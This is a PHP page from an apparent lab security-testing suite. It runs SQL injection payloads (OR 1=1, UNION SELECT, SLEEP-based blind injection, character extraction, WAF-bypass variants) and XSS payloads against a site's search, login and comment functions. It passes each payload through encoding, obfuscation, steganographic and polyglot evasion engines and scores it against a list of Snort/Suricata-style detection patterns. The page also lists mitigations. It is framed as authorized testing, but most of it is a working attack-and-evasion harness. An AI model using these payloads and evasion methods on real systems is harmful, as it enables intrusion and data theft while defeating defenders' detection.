<?php
session_start();
require_once 'config/database.php';
require_once 'includes/functions.php';
require_once 'evasion_engine.php';

// Advanced IDS Evasion Testing
$results = [];
$test_number = 1;

function testAdvancedEvasion($description, $payload, $target = 'search', $evasion_type = 'basic')
{
    global $results, $test_number;

    $result = [
        'test_id' => $test_number++,
        'description' => $description,
        'original_payload' => $payload,
        'evasion_type' => $evasion_type,
        'target' => $target,
        'evaded_payloads' => [],
        'bypass_success' => [],
        'detection_avoidance' => [],
    ];

    try {
        // Apply different evasion techniques
        switch ($evasion_type) {
            case 'multi_layer':
                $result['evaded_payloads']['multi_layer'] = EvasionEngine::multiLayerEncode($payload);
                break;

            case 'sql_obfuscation':
                $result['evaded_payloads']['sql_keywords'] = EvasionEngine::obfuscateSQLKeywords($payload);
                $result['evaded_payloads']['char_based'] = EvasionEngine::charBasedSQLInjection($payload);
                $result['evaded_payloads']['timing_based'] = EvasionEngine::timingBasedEvasion($payload);
                break;

            case 'xss_evasion':
                $result['evaded_payloads'] = EvasionEngine::evadeXSSDetection($payload);
                break;

            case 'http_protocol':
                $result['evaded_payloads'] = EvasionEngine::httpProtocolEvasion($payload);
                break;

            case 'waf_bypass':
                $result['evaded_payloads'] = EvasionEngine::wafBypass($payload);
                break;

            case 'steganographic':
                $result['evaded_payloads']['image_hide'] = SteganographicEvasion::hideInImage($payload);
                $result['evaded_payloads']['css_hide'] = SteganographicEvasion::hideInCSS($payload);
                $result['evaded_payloads']['json_hide'] = SteganographicEvasion::hideInJSON($payload);
                break;

            case 'anti_detection':
                $result['evaded_payloads']['junk_added'] = AntiDetection::addJunk($payload);
                $result['evaded_payloads']['polyglot'] = AntiDetection::polyglotGeneration(['html', 'js', 'sql']);
                break;
        }

        // Test each evaded payload
        foreach ($result['evaded_payloads'] as $method => $evaded) {
            $result['bypass_success'][$method] = testBypassEffectiveness($evaded, $target);
            $result['detection_avoidance'][$method] = checkDetectionEvasion($evaded);
        }
    } catch (Exception $e) {
        $result['error'] = $e->getMessage();
    }

    $results[] = $result;
    return $result;
}

function testBypassEffectiveness($payload, $target)
{
    try {
        switch ($target) {
            case 'search':
                return testSearchBypass($payload);
            case 'login':
                return testLoginBypass($payload);
            case 'comment':
                return testCommentBypass($payload);
            default:
                return false;
        }
    } catch (Exception $e) {
        return ['error' => $e->getMessage()];
    }
}

function testSearchBypass($payload)
{
    try {
        $results = searchPosts($payload);
        return [
            'executed' => true,
            'results_count' => is_array($results) ? count($results) : 0,
            'payload_processed' => true
        ];
    } catch (Exception $e) {
        return [
            'executed' => false,
            'error' => $e->getMessage(),
            'payload_processed' => false
        ];
    }
}

function testLoginBypass($payload)
{
    try {
        $user = authenticateUser($payload, 'dummy_password');
        return [
            'executed' => true,
            'bypass_successful' => $user !== false,
            'user_data' => $user ? 'User returned' : 'No user'
        ];
    } catch (Exception $e) {
        return [
            'executed' => false,
            'error' => $e->getMessage()
        ];
    }
}

function testCommentBypass($payload)
{
    // Simulate comment processing
    return [
        'executed' => true,
        'xss_risk' => (stripos($payload, '<script') !== false || stripos($payload, 'javascript:') !== false),
        'payload_stored' => true
    ];
}

function checkDetectionEvasion($payload)
{
    $detectionPatterns = [
        // Suricata/Snort patterns to evade
        'single_quote' => strpos($payload, "'") === false,
        'or_1_equals_1' => stripos($payload, "' OR 1=1") === false,
        'union_select' => stripos($payload, "UNION SELECT") === false,
        'script_tag' => stripos($payload, "<script>") === false,
        'alert_function' => stripos($payload, "alert(") === false,
        'onload_event' => stripos($payload, "onload=") === false,
        'extractvalue' => stripos($payload, "EXTRACTVALUE") === false,
        'sleep_function' => stripos($payload, "SLEEP(") === false,
        'and_1_equals_1' => stripos($payload, "AND 1=1") === false,
        'double_dash' => strpos($payload, "--") === false,
        'information_schema' => stripos($payload, "Information_Schema") === false,
        'version_function' => stripos($payload, "VERSION(") === false,
        'drop_table' => stripos($payload, "DROP TABLE") === false,
        'load_file' => stripos($payload, "LOAD_FILE") === false,
        'if_condition' => stripos($payload, "IF(") === false,
        'concat_function' => stripos($payload, "CONCAT(") === false,
        'mathematical_ops' => !preg_match('/\d+[\+\-\*\/]\d+/', $payload),
        'sqlmap_agent' => stripos($payload, "sqlmap") === false
    ];

    $evasionScore = array_sum($detectionPatterns) / count($detectionPatterns) * 100;

    return [
        'patterns_evaded' => $detectionPatterns,
        'evasion_percentage' => round($evasionScore, 2),
        'likely_undetected' => $evasionScore > 70
    ];
}

// Start comprehensive evasion testing
if ($_POST['run_advanced_tests'] ?? false) {

    echo "<h2>🔥 ADVANCED IDS EVASION TESTING 🔥</h2>";

    // ===== SQL INJECTION EVASION TESTS =====

    // Test 1: Multi-layer encoding
    testAdvancedEvasion(
        "Multi-layer Encoded SQL Injection",
        "' OR 1=1--",
        "search",
        "multi_layer"
    );

    // Test 2: SQL keyword obfuscation
    testAdvancedEvasion(
        "SQL Keyword Obfuscation",
        "' UNION SELECT user(),version(),@@version,null,null,null--",
        "search",
        "sql_obfuscation"
    );

    // Test 3: Character-based injection
    testAdvancedEvasion(
        "Character-based SQL Injection",
        "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
        "login",
        "sql_obfuscation"
    );

    // Test 4: Timing-based evasion
    testAdvancedEvasion(
        "Timing-based Blind SQL Injection Evasion",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "search",
        "sql_obfuscation"
    );

    // ===== XSS EVASION TESTS =====

    // Test 5: XSS multi-technique evasion
    testAdvancedEvasion(
        "Advanced XSS Evasion",
        "<script>alert('XSS')</script>",
        "comment",
        "xss_evasion"
    );

    // Test 6: Event handler fragmentation
    testAdvancedEvasion(
        "Event Handler Fragmentation XSS",
        "<img src=x onerror=\"alert(1)\">",
        "search",
        "xss_evasion"
    );

    // ===== HTTP PROTOCOL EVASION =====

    // Test 7: HTTP parameter pollution
    testAdvancedEvasion(
        "HTTP Parameter Pollution",
        "' OR 1=1--",
        "search",
        "http_protocol"
    );

    // ===== WAF BYPASS TECHNIQUES =====

    // Test 8: Comment injection
    testAdvancedEvasion(
        "Comment Injection WAF Bypass",
        "' OR/**/1=1/**/--",
        "search",
        "waf_bypass"
    );

    // Test 9: Alternative operators
    testAdvancedEvasion(
        "Alternative Operators WAF Bypass",
        "' || 1 LIKE 1#",
        "login",
        "waf_bypass"
    );

    // ===== STEGANOGRAPHIC EVASION =====

    // Test 10: Payload hiding
    testAdvancedEvasion(
        "Steganographic Payload Hiding",
        "<script>alert('hidden')</script>",
        "comment",
        "steganographic"
    );

    // ===== ANTI-DETECTION TECHNIQUES =====

    // Test 11: Junk data injection
    testAdvancedEvasion(
        "Junk Data Anti-Detection",
        "' OR 1=1--",
        "search",
        "anti_detection"
    );

    // Test 12: Polyglot payloads
    testAdvancedEvasion(
        "Polyglot Multi-Context Payloads",
        "universal_polyglot",
        "search",
        "anti_detection"
    );
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced IDS/IPS Evasion Testing</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .evasion-high {
            background-color: #d4edda;
            border-left: 5px solid #28a745;
        }

        .evasion-medium {
            background-color: #fff3cd;
            border-left: 5px solid #ffc107;
        }

        .evasion-low {
            background-color: #f8d7da;
            border-left: 5px solid #dc3545;
        }

        .payload-display {
            background: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            word-break: break-all;
        }

        .evasion-score {
            font-weight: bold;
            font-size: 1.2em;
        }

        .technique-badge {
            margin: 2px;
            font-size: 0.8em;
        }
    </style>
</head>

<body>
    <div class="container-fluid mt-4">
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-header bg-danger text-white">
                        <h2><i class="fas fa-user-ninja"></i> 🥷 ADVANCED IDS/IPS EVASION TESTING</h2>
                        <p class="mb-0">Sophisticated techniques to bypass Suricata/Snort detection rules</p>
                    </div>

                    <div class="card-body">
                        <?php if (!isset($_POST['run_advanced_tests'])): ?>

                            <div class="alert alert-warning">
                                <h5><i class="fas fa-exclamation-triangle"></i> Advanced Penetration Testing Warning</h5>
                                <p>This module tests sophisticated evasion techniques including:</p>
                                <ul class="row">
                                    <div class="col-md-6">
                                        <li><strong>Multi-layer Encoding</strong> - Base64, URL, ROT13, Hex</li>
                                        <li><strong>SQL Keyword Obfuscation</strong> - Character codes, dynamic construction</li>
                                        <li><strong>XSS Context Evasion</strong> - Event handlers, Unicode, Data URIs</li>
                                        <li><strong>HTTP Protocol Manipulation</strong> - Parameter pollution, chunked encoding</li>
                                    </div>
                                    <div class="col-md-6">
                                        <li><strong>WAF Bypass Techniques</strong> - Comment injection, alternative operators</li>
                                        <li><strong>Steganographic Hiding</strong> - Payload concealment in images/CSS</li>
                                        <li><strong>Anti-Detection Methods</strong> - Junk injection, polyglot payloads</li>
                                        <li><strong>Timing Attack Evasion</strong> - Alternative delay functions</li>
                                    </div>
                                </ul>
                                <p><strong>⚠️ For authorized security testing only!</strong></p>
                            </div>

                            <div class="row mb-4">
                                <div class="col-md-4">
                                    <div class="card border-danger">
                                        <div class="card-header bg-danger text-white">
                                            <h6>🎯 Target Rules</h6>
                                        </div>
                                        <div class="card-body">
                                            <ul class="small">
                                                <li>SQL Injection - Single Quote</li>
                                                <li>SQL Injection - OR 1=1</li>
                                                <li>SQL Injection - UNION SELECT</li>
                                                <li>SQL Injection - EXTRACTVALUE</li>
                                                <li>SQL Injection - SLEEP Attack</li>
                                                <li>XSS - Script Tag</li>
                                                <li>XSS - Alert Function</li>
                                                <li>XSS - Onload Event</li>
                                                <li>CSRF - Missing Token</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>

                                <div class="col-md-4">
                                    <div class="card border-warning">
                                        <div class="card-header bg-warning text-dark">
                                            <h6>🛡️ Evasion Techniques</h6>
                                        </div>
                                        <div class="card-body">
                                            <ul class="small">
                                                <li>Character Code Obfuscation</li>
                                                <li>Multi-layer Encoding</li>
                                                <li>Dynamic Query Construction</li>
                                                <li>Unicode Normalization</li>
                                                <li>HTTP Protocol Manipulation</li>
                                                <li>Comment Injection</li>
                                                <li>Alternative Operators</li>
                                                <li>Steganographic Hiding</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>

                                <div class="col-md-4">
                                    <div class="card border-info">
                                        <div class="card-header bg-info text-white">
                                            <h6>📊 Success Metrics</h6>
                                        </div>
                                        <div class="card-body">
                                            <ul class="small">
                                                <li>Detection Evasion Rate</li>
                                                <li>Payload Execution Success</li>
                                                <li>Bypass Effectiveness Score</li>
                                                <li>Signature Pattern Avoidance</li>
                                                <li>False Negative Generation</li>
                                                <li>Context Preservation</li>
                                                <li>Functional Equivalent Test</li>
                                                <li>IDS/IPS Blind Spots</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <form method="POST" class="text-center">
                                <button type="submit" name="run_advanced_tests" value="1" class="btn btn-danger btn-lg">
                                    <i class="fas fa-rocket"></i> Launch Advanced Evasion Testing
                                </button>
                            </form>

                        <?php else: ?>
                            <!-- Advanced Testing Results -->
                            <div class="alert alert-info mb-4">
                                <h5><i class="fas fa-chart-line"></i> Advanced Evasion Test Results</h5>
                                <div class="row">
                                    <div class="col-md-3">
                                        <strong>Total Tests:</strong> <?php echo count($results); ?>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>High Evasion:</strong>
                                        <span class="badge bg-success">
                                            <?php
                                            $highEvasion = 0;
                                            foreach ($results as $result) {
                                                foreach ($result['detection_avoidance'] as $detection) {
                                                    if ($detection['evasion_percentage'] > 80) $highEvasion++;
                                                }
                                            }
                                            echo $highEvasion;
                                            ?>
                                        </span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Bypass Success:</strong>
                                        <span class="badge bg-warning text-dark">
                                            <?php
                                            $successfulBypasses = 0;
                                            foreach ($results as $result) {
                                                foreach ($result['bypass_success'] as $success) {
                                                    if ($success['executed'] ?? false) $successfulBypasses++;
                                                }
                                            }
                                            echo $successfulBypasses;
                                            ?>
                                        </span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Techniques Used:</strong> <span class="badge bg-info">12</span>
                                    </div>
                                </div>
                            </div>

                            <!-- Detailed Results for Each Test -->
                            <div class="row">
                                <?php foreach ($results as $result): ?>
                                    <div class="col-12 mb-4">
                                        <div class="card">
                                            <div class="card-header">
                                                <h6>
                                                    <i class="fas fa-flask"></i> Test #<?php echo $result['test_id']; ?>:
                                                    <?php echo htmlspecialchars($result['description']); ?>
                                                    <span class="badge bg-secondary"><?php echo strtoupper($result['evasion_type']); ?></span>
                                                </h6>
                                            </div>

                                            <div class="card-body">
                                                <div class="row">
                                                    <div class="col-md-6">
                                                        <h6>📝 Original Payload:</h6>
                                                        <div class="payload-display mb-3">
                                                            <?php echo htmlspecialchars($result['original_payload']); ?>
                                                        </div>

                                                        <h6>🎯 Target: <?php echo htmlspecialchars($result['target']); ?></h6>
                                                    </div>

                                                    <div class="col-md-6">
                                                        <h6>🛡️ Evasion Techniques Applied:</h6>
                                                        <?php foreach ($result['evaded_payloads'] as $method => $payload): ?>
                                                            <span class="badge bg-info technique-badge"><?php echo htmlspecialchars($method); ?></span>
                                                        <?php endforeach; ?>
                                                    </div>
                                                </div>

                                                <hr>

                                                <!-- Evasion Results -->
                                                <h6>🔍 Detection Evasion Analysis:</h6>
                                                <div class="row">
                                                    <?php foreach ($result['detection_avoidance'] as $method => $detection): ?>
                                                        <div class="col-md-6 mb-3">
                                                            <div class="card <?php
                                                                                if ($detection['evasion_percentage'] > 80) echo 'evasion-high';
                                                                                elseif ($detection['evasion_percentage'] > 50) echo 'evasion-medium';
                                                                                else echo 'evasion-low';
                                                                                ?>">
                                                                <div class="card-body p-3">
                                                                    <h6><?php echo htmlspecialchars($method); ?></h6>
                                                                    <div class="evasion-score">
                                                                        Evasion Rate: <?php echo $detection['evasion_percentage']; ?>%
                                                                    </div>
                                                                    <div class="small">
                                                                        <?php if ($detection['likely_undetected']): ?>
                                                                            <span class="badge bg-success">Likely Undetected</span>
                                                                        <?php else: ?>
                                                                            <span class="badge bg-danger">May be Detected</span>
                                                                        <?php endif; ?>
                                                                    </div>

                                                                    <!-- Show which patterns were evaded -->
                                                                    <div class="mt-2">
                                                                        <small>Patterns Evaded:</small><br>
                                                                        <?php foreach ($detection['patterns_evaded'] as $pattern => $evaded): ?>
                                                                            <span class="badge <?php echo $evaded ? 'bg-success' : 'bg-danger'; ?> me-1 mb-1" style="font-size: 0.7em;">
                                                                                <?php echo htmlspecialchars($pattern); ?>
                                                                            </span>
                                                                        <?php endforeach; ?>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    <?php endforeach; ?>
                                                </div>

                                                <!-- Bypass Success Results -->
                                                <h6>⚡ Execution Results:</h6>
                                                <div class="row">
                                                    <?php foreach ($result['bypass_success'] as $method => $success): ?>
                                                        <div class="col-md-4 mb-2">
                                                            <div class="alert <?php echo ($success['executed'] ?? false) ? 'alert-success' : 'alert-danger'; ?> p-2">
                                                                <strong><?php echo htmlspecialchars($method); ?>:</strong><br>
                                                                <?php if ($success['executed'] ?? false): ?>
                                                                    ✅ Executed Successfully
                                                                    <?php if (isset($success['bypass_successful']) && $success['bypass_successful']): ?>
                                                                        <br>🔓 Bypass Achieved
                                                                    <?php endif; ?>
                                                                <?php else: ?>
                                                                    ❌ Execution Failed
                                                                <?php endif; ?>
                                                            </div>
                                                        </div>
                                                    <?php endforeach; ?>
                                                </div>

                                                <!-- Show evaded payloads -->
                                                <div class="mt-3">
                                                    <button class="btn btn-sm btn-outline-secondary" type="button" data-bs-toggle="collapse"
                                                        data-bs-target="#payloads<?php echo $result['test_id']; ?>">
                                                        Show Evaded Payloads
                                                    </button>
                                                    <div class="collapse mt-2" id="payloads<?php echo $result['test_id']; ?>">
                                                        <?php foreach ($result['evaded_payloads'] as $method => $payload): ?>
                                                            <div class="mb-2">
                                                                <strong><?php echo htmlspecialchars($method); ?>:</strong>
                                                                <div class="payload-display" style="font-size: 0.8em; max-height: 100px; overflow-y: auto;">
                                                                    <?php echo htmlspecialchars(is_array($payload) ? json_encode($payload, JSON_PRETTY_PRINT) : $payload); ?>
                                                                </div>
                                                            </div>
                                                        <?php endforeach; ?>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                <?php endforeach; ?>
                            </div>

                            <!-- Advanced Security Assessment -->
                            <div class="alert alert-dark mt-4">
                                <h5><i class="fas fa-shield-alt"></i> Advanced Security Assessment</h5>

                                <?php
                                $totalTests = count($results);
                                $totalEvasions = 0;
                                $highEvasionCount = 0;
                                $successfulBypasses = 0;

                                foreach ($results as $result) {
                                    foreach ($result['detection_avoidance'] as $detection) {
                                        $totalEvasions++;
                                        if ($detection['evasion_percentage'] > 80) $highEvasionCount++;
                                    }
                                    foreach ($result['bypass_success'] as $success) {
                                        if ($success['executed'] ?? false) $successfulBypasses++;
                                    }
                                }

                                $overallEvasionRate = $totalEvasions > 0 ? ($highEvasionCount / $totalEvasions) * 100 : 0;
                                ?>

                                <div class="row">
                                    <div class="col-md-4">
                                        <h6>🎯 Overall Evasion Success Rate</h6>
                                        <div class="progress mb-3">
                                            <div class="progress-bar <?php echo $overallEvasionRate > 70 ? 'bg-danger' : ($overallEvasionRate > 40 ? 'bg-warning' : 'bg-success'); ?>"
                                                style="width: <?php echo $overallEvasionRate; ?>%">
                                                <?php echo round($overallEvasionRate, 1); ?>%
                                            </div>
                                        </div>
                                    </div>

                                    <div class="col-md-4">
                                        <h6>⚡ Functional Bypass Rate</h6>
                                        <div class="progress mb-3">
                                            <?php $bypassRate = ($successfulBypasses / max($totalEvasions, 1)) * 100; ?>
                                            <div class="progress-bar bg-danger" style="width: <?php echo $bypassRate; ?>%">
                                                <?php echo round($bypassRate, 1); ?>%
                                            </div>
                                        </div>
                                    </div>

                                    <div class="col-md-4">
                                        <h6>🛡️ IDS/IPS Effectiveness</h6>
                                        <div class="progress mb-3">
                                            <?php $effectiveness = 100 - $overallEvasionRate; ?>
                                            <div class="progress-bar <?php echo $effectiveness > 70 ? 'bg-success' : ($effectiveness > 40 ? 'bg-warning' : 'bg-danger'); ?>"
                                                style="width: <?php echo $effectiveness; ?>%">
                                                <?php echo round($effectiveness, 1); ?>%
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <?php if ($overallEvasionRate > 70): ?>
                                    <div class="alert alert-danger">
                                        <h6><strong>🚨 CRITICAL SECURITY GAP!</strong></h6>
                                        <p>The current IDS/IPS rules are highly ineffective against advanced evasion techniques:</p>
                                        <ul>
                                            <li><strong>Multi-layer Encoding:</strong> Bypasses signature-based detection</li>
                                            <li><strong>Dynamic Construction:</strong> Evades static pattern matching</li>
                                            <li><strong>Protocol Manipulation:</strong> Exploits HTTP parsing inconsistencies</li>
                                            <li><strong>Context Switching:</strong> Abuses input validation gaps</li>
                                        </ul>
                                    </div>
                                <?php endif; ?>

                                <h6>🔧 Advanced Mitigation Strategies:</h6>
                                <div class="row">
                                    <div class="col-md-6">
                                        <ul>
                                            <li><strong>Deep Packet Inspection:</strong> Analyze decoded payloads</li>
                                            <li><strong>Behavioral Analysis:</strong> Monitor unusual request patterns</li>
                                            <li><strong>Machine Learning Detection:</strong> AI-based anomaly detection</li>
                                            <li><strong>Input Normalization:</strong> Decode all input layers before analysis</li>
                                            <li><strong>Context-Aware Filtering:</strong> Different rules per application context</li>
                                        </ul>
                                    </div>
                                    <div class="col-md-6">
                                        <ul>
                                            <li><strong>Threat Intelligence:</strong> Dynamic rule updates</li>
                                            <li><strong>Zero-Trust Architecture:</strong> Assume breach mentality</li>
                                            <li><strong>Runtime Protection:</strong> RASP and code-level security</li>
                                            <li><strong>Security Orchestration:</strong> Automated response systems</li>
                                            <li><strong>Red Team Exercises:</strong> Regular evasion testing</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>

                            <div class="text-center mt-4">
                                <a href="test_evasion_advanced.php" class="btn btn-secondary">
                                    <i class="fas fa-redo"></i> Re-run Tests
                                </a>
                                <a href="test_all_vulnerabilities.php" class="btn btn-primary">
                                    <i class="fas fa-arrow-right"></i> Full Security Test
                                </a>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>